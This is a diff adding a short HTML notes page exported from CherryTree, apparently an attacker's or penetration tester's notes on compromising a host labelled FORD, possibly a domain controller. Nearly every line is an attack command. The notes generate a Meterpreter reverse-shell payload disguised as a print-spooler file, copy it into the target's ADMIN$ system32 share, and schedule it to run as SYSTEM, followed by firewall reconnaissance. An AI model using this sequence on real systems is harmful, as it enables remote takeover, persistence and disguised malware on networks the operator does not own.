@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>192.168.202(201).2 FORD</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>192.168.202(201).2 FORD</h1><br/>DC<br /><br />from LOWE<br />net use \\FORD\ADMIN$<br />msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ens192 lport=3231 -f exe -a x64 -o msspool64.exe<br />file msspool64.exe<br />use exploit/multi/handler<br />upload /root/payloads/msspool64.exe \\\\FORD\\ADMIN$\\system32\\msspool64.exe<br />net time \\FORD<br />schtasks /s FORD /create /tn Spoolx642  /tr msspool64.exe /sc once /st 11:45:32 /ru SYSTEM<br /><br /><br />netsh firewall show state<br />netsh firewall show portopening<br />netsh firewall show config<br /><br />7367 is open on both sides</div></body></html>
